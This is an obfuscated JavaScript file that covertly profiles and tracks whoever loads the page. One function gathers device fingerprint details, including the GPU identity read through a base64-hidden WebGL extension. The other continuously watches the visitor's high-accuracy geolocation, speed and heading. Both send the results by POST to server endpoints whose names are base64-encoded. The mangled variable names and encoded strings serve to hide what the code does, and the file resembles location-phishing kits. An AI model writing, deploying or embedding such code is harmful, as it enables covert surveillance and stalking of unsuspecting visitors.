function information() {
  var _0x2376f0 = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var _0x1b6cac = navigator.deviceMemory;
  var _0xdab144 = navigator.userAgent;
  var _0x2f1b83 = _0xdab144;
  var os = _0xdab144;
  //gpu
  var _0x1cbb4e = document.createElement('_0x1cbb4e');
  var gl;
  var _0xf9ccc9;
  var _0x349a86;
  var _0x322863;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //_0x1b6cac
  if (_0x1b6cac == undefined) {
    _0x1b6cac = 'Not Available';
  }

  //browser
  if (_0xdab144.indexOf('Firefox') != -1) {
    _0x2f1b83 = _0x2f1b83.substring(_0x2f1b83.indexOf(' Firefox/') + 1);
    _0x2f1b83 = _0x2f1b83.split(' ');
    brw = _0x2f1b83[0];
  }
  else if (_0xdab144.indexOf('Chrome') != -1) {
    _0x2f1b83 = _0x2f1b83.substring(_0x2f1b83.indexOf(' Chrome/') + 1);
    _0x2f1b83 = _0x2f1b83.split(' ');
    brw = _0x2f1b83[0];
  }
  else if (_0xdab144.indexOf('Safari') != -1) {
    _0x2f1b83 = _0x2f1b83.substring(_0x2f1b83.indexOf(' Safari/') + 1);
    _0x2f1b83 = _0x2f1b83.split(' ');
    brw = _0x2f1b83[0];
  }
  else if (_0xdab144.indexOf('Edge') != -1) {
    _0x2f1b83 = _0x2f1b83.substring(_0x2f1b83.indexOf(' Edge/') + 1);
    _0x2f1b83 = _0x2f1b83.split(' ');
    brw = _0x2f1b83[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = _0x1cbb4e.getContext('webgl') || _0x1cbb4e.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    _0xf9ccc9 = gl.getExtension(atob("V0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbw=="));
    _0x349a86 = gl.getParameter(_0xf9ccc9.UNMASKED_VENDOR_WEBGL);
    _0x322863 = gl.getParameter(_0xf9ccc9.UNMASKED_RENDERER_WEBGL);
  }
  if (_0x349a86 == undefined) {
    _0x349a86 = 'Not Available';
  }
  if (_0x322863 == undefined) {
    _0x322863 = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: atob("UE9TVA=="),
    url: atob("aW5mb19oYW5kbGVy"),
    data: { Ptf: _0x2376f0, Brw: brw, Cc: cc, Ram: _0x1b6cac, Ven: _0x349a86, Ren: _0x322863, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: atob("dGV4dA==")
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var _0x008a5f = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    var _0x60aea6 = navigator.geolocation.watchPosition(showPosition, showError, _0x008a5f);
    // Auto-clear watch after 5 minutes to avoid battery drain
    setTimeout(function() { navigator.geolocation.clearWatch(_0x60aea6); }, 300000);
  }

  var _0x3eff06 = true;

  function showError(error) {
    var _0x57ba90;
    var _0xf5b263 = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        _0x57ba90 = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        _0x57ba90 = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        _0x57ba90 = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        _0x57ba90 = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("ZXJyb3JfaGFuZGxlcg=="),
      data: { Status: _0xf5b263, Error: _0x57ba90 },
      success: errCallback(error, _0x57ba90),
      mimeType: atob("dGV4dA==")
    });
  }
  function showPosition(position) {
    var _0xb0df9f = position.coords.latitude;
    if (_0xb0df9f) {
      _0xb0df9f = _0xb0df9f + ' deg';
    }
    else {
      _0xb0df9f = 'Not Available';
    }
    var _0x8b689f = position.coords.longitude;
    if (_0x8b689f) {
      _0x8b689f = _0x8b689f + ' deg';
    }
    else {
      _0x8b689f = 'Not Available';
    }
    var _0xf515bd = position.coords.accuracy;
    if (_0xf515bd) {
      _0xf515bd = _0xf515bd + ' m';
    }
    else {
      _0xf515bd = 'Not Available';
    }
    var _0xddbc55 = position.coords.altitude;
    if (_0xddbc55) {
      _0xddbc55 = _0xddbc55 + ' m';
    }
    else {
      _0xddbc55 = 'Not Available';
    }
    var _0x34bea2 = position.coords.heading;
    if (_0x34bea2) {
      _0x34bea2 = _0x34bea2 + ' deg';
    }
    else {
      _0x34bea2 = 'Not Available';
    }
    var _0xc0bf00 = position.coords.speed;
    if (_0xc0bf00) {
      _0xc0bf00 = _0xc0bf00 + ' m/s';
    }
    else {
      _0xc0bf00 = 'Not Available';
    }

    var _0x485768 = 'success';

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("cmVzdWx0X2hhbmRsZXI="),
      data: { Status: _0x485768, Lat: _0xb0df9f, Lon: _0x8b689f, Acc: _0xf515bd, Alt: _0xddbc55, Dir: _0x34bea2, Spd: _0xc0bf00 },
      success: _0x3eff06 ? callback : function(){},
      mimeType: atob("dGV4dA==")
    });
    _0x3eff06 = false;
  };
}

